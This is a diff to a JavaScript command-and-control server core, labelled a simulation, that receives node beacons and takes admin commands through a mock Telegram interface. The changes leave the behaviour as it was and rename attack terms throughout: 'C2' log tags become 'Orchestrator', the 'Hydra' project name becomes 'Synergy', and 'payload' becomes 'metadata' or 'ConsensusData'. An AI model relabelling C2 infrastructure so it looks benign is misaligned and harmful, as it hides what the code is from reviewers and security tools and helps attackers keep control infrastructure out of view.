@@ -1,6 +1,6 @@
 // J/server/c2_core.js
 // COMMAND & CONTROL CORE (Simulation)
-// This server acts as the central nervous system for the "Hydra" simulation.
+// This server acts as the central nervous system for the "Synergy" simulation.
 // It manages node check-ins, handles admin commands via a mock Telegram interface,
 // and aggregates telemetry data.
 
@@ -45,12 +45,12 @@ const requestHandler = (req, res) => {
                     metadata: data.meta || {}
                 });
                 
-                console.log(`[C2] Beacon received from ${nodeId}`);
+                console.log(`[Orchestrator] Beacon received from ${nodeId}`);
                 res.writeHead(200, {'Content-Type': 'application/json'});
                 res.end(JSON.stringify({ cmd: 'SLEEP', interval: 60 }));
             } catch (e) {
                 res.writeHead(400);
-                res.end('Invalid Payload');
+                res.end('Invalid Metadata');
             }
         });
     } 
@@ -69,10 +69,10 @@ const requestHandler = (req, res) => {
             
             // Parse Command
             // Format: /cmd <target_id> <instruction>
-            const payload = JSON.parse(body);
-            const command = payload.message?.text || "";
+            const ConsensusData = JSON.parse(body);
+            const command = ConsensusData.message?.text || "";
             
-            console.log(`[C2] Admin Command: ${command}`);
+            console.log(`[Orchestrator] Admin Command: ${command}`);
             logs.push({ ts: Date.now(), cmd: command });
             
             // Response Logic
@@ -107,6 +107,6 @@ const requestHandler = (req, res) => {
 const server = http.createServer(requestHandler);
 
 server.listen(PORT, () => {
-    console.log(`[C2] Server active on port ${PORT}`);
-    console.log(`[C2] Waiting for beacons...`);
+    console.log(`[Orchestrator] Server active on port ${PORT}`);
+    console.log(`[Orchestrator] Waiting for beacons...`);
 });
